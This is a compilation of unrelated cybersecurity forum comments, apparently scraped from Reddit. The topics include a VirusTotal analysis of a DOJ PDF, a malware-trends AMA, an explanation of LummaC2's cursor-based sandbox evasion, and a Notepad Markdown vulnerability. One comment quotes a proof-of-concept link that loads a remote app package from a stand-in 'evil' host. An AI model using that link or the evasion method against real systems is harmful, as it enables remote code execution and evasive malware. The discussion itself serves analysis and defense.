      "text": "Hey all, stumbled across something odd while digging into the Epstein DOJ releases.\n\nThe file EFTA01133110.pdf (from Data Set 9, the one with the raw meat slabs photo in a freezer that got pulled pretty quick) has this SHA-256 hash:\n\nbbbe03b56d9e47fdc5ffeb73a5c50a70e694af12f14566075fa283fb61fc7ee4\n\nI ran it on VirusTotal (public page: [ https://www.virustotal.com/gui/file/bbbe03b56d9e47fdc5ffeb73a5c50a70e694af12f14566075fa283fb61fc7ee4/behavior ](https://www.virustotal.com/gui/file/bbbe03b56d9e47fdc5ffeb73a5c50a70e694af12f14566075fa283fb61fc7ee4/behavior))\n\n•  Static detections: 0/XX – totally clean on AV side.\n\n•  But the Behavior tab (sandboxes like CAPE, Jujubox, Zenbox) shows a bunch of red flags:\n\n•  Exploitation for Client Execution (T1203) + Process Injection (T1055)\n\n•  Anti-analysis stuff: IsDebuggerPresent, Sleep calls, GetTickCount/GetTickCount64 timing checks\n\n•  Drops temp files/logs/JS-related items, weird registry mods (mostly Adobe/Office paths), spawns Acrobat crash processors + system stuff like svchost/dllhost\n\n•  Network to adobe.com/Akamai/MSN domains (legit-looking but in context…)\n\n•  Mutexes like “Global\\\\\\\\AdobeCrashProcessor ocall\\\\\\_owl\\\\\\_ork” and “Global\\\\\\\\ARM Update Mutex”\n\nHighlighted text in sandbox: “EFTA01133110.pdf - Adobe Acrobat Reader (32-bit)”, dimensions like “1.488 x 20.28 in” at 319% zoom – clearly it’s rendering that meat photo.\n\nFrom what I read, the photo is just big steaks on a tray in a kitchen/freezer setup (people say it’s beef, maybe from Epstein’s properties?), but the PDF itself behaves like it has some exploit code or malformed junk that trips sandboxes.\n\nAnyone else upload/analyze this one? Is it just Adobe Reader being weird in VMs (font handling, crash reporting, etc.), or could the file have been tampered with before upload? Or maybe a false positive from how evidence photos get scanned/embedded?\n\nNot claiming it’s malware – just weird that a “simple photo PDF” from official DOJ drops looks like this dynamically. Thoughts?\n\n[Source file](https://filebin.net/5yo5jl18d97uo7uv)",

Now it processes network-originated data and apparently passes\n\n  unsanitized input to system commands somewhere in that pipeline.\n\n\n\n  There's already a public PoC floating around, so patch ASAP.

Instead, it makes use of ordinary WiFi devices already communicating with each other nearby. As radio waves move through a space and interact with people, they create distinctive patterns that can be captured and analyzed. These patterns are comparable to images produced by cameras, but they are formed using radio signals rather than light.

To tackle this, Discord should consider more robust verification methods, like integrating identity verification services that utilize government-issued IDs or biometric checks.\n\nThe reason why Discord implements age check this way is *precisely* because they don't want to rely on more stringent verification services. They probably don't care much if X% of their user base bypass it using some cheap trick.",

So… we’re polishing the same turd, just with a bigger GPU.\n\nWhat I *have not* heard\n\n“Here’s how we get in front of adversaries and make them bleed time/money.”\n\n“Here’s a new defense-in-depth model where hunting is built-in, not a vibes-based afterthought.”\n\n“Here’s how we make attackers’ iteration loop slower than ours.”\n\nInstead it’s: make your silo shinier. Make your dashboard calmer. Make your weekly metrics prettier. (make me look better!)\n\nAnd if you’ve ever been hired to “combat threat actors across the whole company,” you know the brick wall - we all hit it head first\n\nSo the org keeps doing what it can measure today: more triage, better filtering, fancier scoring.\n\nAI could actually break the wall. But breaking walls doesn’t sell as clean as “30% less noise.”\n\nAm I wrong? You know what? F it. I know I'm not wrong.  \nIt's all turd polishing",

Not anything we wanted, but okay cool whatever. \n\nIs anyone getting any real value from AI? I've found the best use case is having it write little tools that are fairly simple, but more effort than I would have put into making them. It breaks as soon as you ask for anything novel though. It's kind of okay for asking questions for new tech you haven't encountered before, but I could have just found an explanation online for 99% of it.

These companies are trying to productize what in-house security teams build out at high talent density tech companies in the Bay Area, and try to sell it to non-tech companies. But the gap is still human ability - the people at the non-tech companies don't have sufficient ability to properly deploy and use the tools like the people at Anthropic using their own product, Claude, do.

The signal-to-noise ratio on most SIEM alerts is so bad that even a good model just learns to replicate the same fatigue.\n\nWhere I have seen it actually work well is in mobile/application security testing -- specifically in automating the exploratory phase. Dynamic analysis of a mobile app requires navigating through authentication flows, triggering edge cases, testing how the app reacts to a modified environment, and correlating runtime behavior with static findings. That workflow maps well to an agent-based approach because the LLM can reason about what it is observing (e.g. \"the app crashed when I toggled this setting, let me check the logs and try to reproduce with instrumentation\"). The feedback loop is tight and the action space is constrained enough to be useful.\n\nThe actual turd polishing IMO is: AI-generated compliance reports, AI vulnerability descriptions that just rephrase the CVE text, and any product that claims to \"autonomously remediate\" findings by generating code patches. The liability alone makes that a non-starter for anything serious.\n\nThe real question is whether AI gets good enough at reasoning about program behavior to find novel vulnerabilities. Current models can identify known bad patterns, but finding a new logic bug in auth flow requires understanding developer intent vs actual behavior. That is still very much a human skill.",

I also rely on a well curated RSS feed and a few trusted practitioners for analysis instead of headlines.

We're the Picus Labs Research Team, and we're here for an AMA.\n\nFor the **Red Report 2026**, we analyzed **1.1 million malware samples** and mapped 1**5.5 million malicious action**s to **MITRE ATT&CK** to understand what actually worked for attackers in the last year.\n\nThe headline shift is what we call the “**Digital Parasite**,” a move toward silent persistence, stealthy execution, and living longer in real environments, with credential theft now appearing in nearly 1 in 4 attacks and ransomware-style encryption trending down. \n\nWe are here to share what the data says, what surprised us, and what defenders can do next week. **Ask us anything about the methodology, top techniques, trends, or practical prevention and detection ideas.**\n\n**Key Technical Findings from the 2026 Research:**\n\n* We observed a **38% decrease** in encryption (T1486). Adversaries are trading \"loud\" ransomware for silent, long-term data extortion to stay undetected.\n* **80% of the top ten techniques** are now dedicated to evasion and persistence. If your security controls aren't hunting for **Process Injection (#1 for three years running)**, you're likely blind to persistent malware.\n* Sandbox evasion rose to **#4**. Modern malware like **LummaC2** now uses **trigonometry** to calculate the Euclidean distance of mouse movements to prove a human is present before execution.\n\n**Participants:**\n\n* **Dr. Suleyman Ozarslan**, Co-founder and VP of Picus Labs ([u/malware\\_bender](https://www.reddit.com/user/malware_bender/))\n* **Sıla Ozeren Hacioglu**, Security Research Engineer ([u/sila-ozeren](https://www.reddit.com/user/sila-ozeren/))\n* **Huseyin Can Yuceel**, Research Lead ([u/hcyuceel\\_picus](https://www.reddit.com/user/hcyuceel_picus/))\n\n[Proof Photos](https://imgur.com/a/jeKFo9a)\n\nWe'll be here on February 19, 2026, answering your questions.\n\n**Links:**\n\n* [Red Report 2026](https://7048931.fs1.hubspotusercontent-na1.net/hubfs/7048931/Picus-RedReport2026.pdf)",

              "text": "**TL;DR:** Trigonometry isn’t required for malware to run, but it’s a clever anti-analysis upgrade that makes sandbox evasion much harder to fake by verifying realistic human behavior before dropping the payload.  \n  \nHi!! I would be overstating it if I said malware needs math to escape virtualization environments or sandboxes :)). What we are seeing now is that some families are starting to use trigonometry and similar calculations to make user-activity checks more granular and harder to mimic.\n\nWe are all familiar with the classic sandbox evasion tricks (I am pretty sure many of you have seen them before): checking for VM artifacts, looking at suspicious process names, validating system uptime, inspecting user directories, or simply waiting for basic mouse movement. *That part isn’t new.* The difference is the refinement. Instead of checking for movement, it checks for believable movement. It’s not about math for the sake of math, it’s just making sandbox evasion harder to realistically fake :)).\n\nHere is how LummaC2 executed this technique.\n\nThe malware repeatedly queries Windows for the cursor position using the `GetCursorPos()` function. It waits until the cursor moves at least once. Then, within a short time window, it records several cursor positions in sequence, pausing briefly between each check.\n\nEach recorded position is simply an `(x, y) coordinate` on the screen. When two consecutive points are connected, they form a line segment. The malware calculates the length of that segment using the standard `Euclidean distance formula` used to measure the distance between two points on a graph:\n\n`√((x₂ − x₁)² + (y₂ − y₁)²)`\n\nIt then calculates the angle between consecutive movement vectors using the dot product formula:\n\n`cos(θ) = (A · B) / (|A||B|)`\n\nThe resulting angle is converted to degrees and compared against a hardcoded threshold. If the directional changes between movement segments are small and consistent, the motion is considered smooth and human-like. If the angles are sharp or inconsistent, it suggests scripted or synthetic input.\n\nAutomated sandboxes often generate straight-line or low-complexity cursor paths. Human motion, even when attempting to move in a straight line, naturally contains micro-curves and gradual directional transitions. By mathematically evaluating curvature and smoothness, LummaC2 effectively adds a probabilistic filter to determine whether it is operating in a real user environment.\n\nSorry for the long reply!! :)",

Signature-based detection has always been effective when the artifact is stable and observable.\n\nThe challenge, as the report points out, is that modern malware activity increasingly prioritizes evasion and persistence over traditional payload delivery (with 80% of the top 10 now focusing on stealth, it is safe to say we are facing a **stealth epidemic** right now).\n\nTechniques like process injection, defense impairment, credential abuse (observed in 1 out of every 4 malware samples), and cloud/API misuse for stealthy data exfiltration, not to mention that 19% of malware now relies on application-layer protocols, *do not always leave static artifacts* that file-based rules can reliably match. \n\nBecause of that shift, relying *primarily* on YARA-style matching creates visibility gaps.\n\nRR26’s key findings favor a behavior-centric model, with a strong emphasis on *continuous validation*. It is not just about detecting techniques rather than samples or incorporating memory and identity telemetry, but about systematically and repeatedly validating implemented security controls against the most prevalent TTPs to clearly identify where they fail. That continuous validation component is critical, as it ensures defenses are not assumed to work but are actively proven against real-world adversary behavior.\n\nSo it is *less about YARA being obsolete* and more about it *being insufficient as a standalone practice* in the current threat landscape.",

Based on the data we analyzed, we did not see clear evidence of AI creating fundamentally new malware techniques or novel attacker tradecraft. Adversaries do use automation, and AI can help them scale tasks such as phishing generation, scripting, or reconnaissance. However, this does not translate into new ATT&CK techniques or entirely new behavioral patterns. In practice, AI is accelerating known operations rather than inventing new ones.\n\nRegarding defensive use of AI, our research did not evaluate security products directly, so we cannot make a data-backed claim about their overall impact or effectiveness.",

Takes longer to load, more resource heavy. Just need something simple for day-to-day stuff.\n\nFor those who already made the switch - what are you using now that's actually comparable? Need something lightweight that doesn't slow down basic tasks.\n\nAny suggestions?",

However, Microsoft seems to treat security as mostly a PR problem (blame the user) and a profit center (cyber consulting garnered them $20b in revenue last year.) Not to mention the usual 100+ patches every Patch Tuesday. As a cyber incident responder, I always have to deal with windows issues — with no macos and Linux security issues to be seen. \n\nIn my view, the boatload of Microsoft security incidents over the decades shows a company with a broken security culture. While I am grateful for the lifetime job security I have as an incident responder due to the pervasive insecurity of Microsoft products, I can’t trust them to do the right thing.",

Either way, it's not something that engenders trust in the platform.\n\nThis brings into question other claims that Discord makes about their data handling. They claim they don't sell your data, but they could easily be providing it to companies or governments anyway.

Not what's occurring here, from just knowing how notepad works... It doesn't listen on the network...\n\nIf the PoC we've seen:\n```\n[poc](ms-appinstaller://?source=https://evil/xxx.appx)\n```\nis what Msft patched, this is a 2-3 click (one for opening the md file, a Ctrl+click to execute the link, and an accept on a security warning).\n\nIt matches Msft's description outlined in their CVE issuance found here: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20841\n\nOr it's a vulnerability in the markdown parser, which no one has released yet, which would be much cooler and more technically impressive than the above.\n\nEdit: Notes from the FAQ for those interested:\n```\nHow could an attacker exploit this vulnerability?\n\nAn attacker could trick a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to launch unverified protocols that load and execute remote files.\n\nAccording to the CVSS metric, the attack vector is network (AV:N) and user interaction is required (UI:R). What is the target context of the remote code execution?\n\nThe malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user.\n```",

Vehicle intelligence is the perfect example.\n\nYeah, this is probably one of the most scary applications of AI technology. Take every bit of information about browsing activities, cell phone data, marketing information... feed it as much data as you can. Feed it even the stuff that would usually be waaaaay too hard to use. Eventually you'll have very thorough profiles on every person, you'll have unbelievable leverage over them.\n\nThis is what US and Israeli intelligence and some private companies like Palantir are trying to do. They basically want to run something like a SIEM, except the logging is about people and they have the best AI analyzing all the data for them. Scary stuff. Doubly so when you realize just how in bed many of the private companies that have your data are with the US government and just how many of the people working in them are ex-Israeli intelligence.",

Hopefully your company has good documentation, if they already have established SOC playbooks, SOPs, etc, start by reviewing those. You should at least know which playbook to execute when. Build the bigger picture from there with your team's Security Incident Response plan, and then your company's overall Incident Response plan.\n\nYour manager probably has specific skills that he will want you to develop, maybe even a whole training plan already created. If he leaves it open to you, there's really two paths you can choose. Hands-on virtual labs like Let's Defend or THM/HTB SOC learning paths. Or traditional certifications that might be a mix of labs and lecture like CySA+, BTL1, or SC-200 (if you are a Microsoft shop).",

Write down what you do and what you learned.  This can be on a blog or github or postbin or something.  But make sure you document your journey.  Then see if you can find a local security group.  There are many local DEFCON groups (Named DC, followed by your area code, like DC865).  Or you might find a local ISC2 or ISSA chapter to join.  \n\nI wish you the best as you grow and learn in your career.",

Whether or not it's worth the trade-off, well that's probably more personal. Fast charging and a small battery pack, achieve a similar goal as having extra batteries to be swapped.  \nIn a security sense, I'm sure this sucks quite a bit. But, there's more to the story.  \nI sure as shit wouldn't want these mass produced things going to the dump just because of a little water. So, unfortunately, this isn't necessarily a bad thing either.  \nNot everyone bothered with the battery replacements; at least that wouldn't take one of the current phones in to have it done.\n\nBecause we don't really control where these devices are built since it's often in countries like China. It has gotten to the point on a hardware security level that Apple won't allow an exact battery, swapped from another brand new phone.  \nThis sounds horrible, because for a corporation like Apple it pretty much is.  \nBut, this implies they are taking action against attacks on the supply chain.\n\nSo, these things are double edge swords unfortunately.\n\nWhat kind of security do we want?  \nEspecially considering a direct attack, via the LTE chip or otherwise is nothing in comparison to implanted hardware somewhere along the supply chain.  \nWhich has certainly been reported. Thankfully, not for main brand phones.\n\nBut, heck I believe this sort of thing impacted cisco switches, so what is even the concern of the phones..",

Apple is doing great work defending their platform and there will probably come a time in the future where the spyware only works on older iOS versions\n\nBut nso group has essentially infinite money and resources so if a bug exists they will find it \n\nThink about it like this: all c code will have a vulnerability every x lines of code with x depending on who is writing it, how well the platform is designed, how researched the code is, etc. Apple is trying to decrease the amount of code that is reachable without user interaction or authentication, while at the same time increasing the value of x with exploit mitigations like MIE. When the amount of code reachable without user interaction becomes smaller than the value of x, then there will be no more zero click vulnerabilities, but because iOS is such a massive complex platform, that is a huge undertaking that will take a long time",
